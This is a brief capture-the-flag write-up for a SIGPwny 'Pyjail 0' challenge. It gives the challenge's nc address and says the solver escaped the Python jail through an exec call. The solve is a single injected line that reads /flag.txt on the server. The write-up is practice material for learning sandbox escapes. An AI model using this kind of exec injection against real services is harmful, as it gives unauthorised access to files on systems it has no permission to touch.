## url
https://ctf.sigpwny.com/challenges#Meetings/Pyjail%200-629

## challenge
nc chal.sigpwny.com 5009

## Concept

We was tasked to escape the pyjail and from the source code given we found the exec function which we exploited

## Method of solve
print(open('/flag.txt').read())
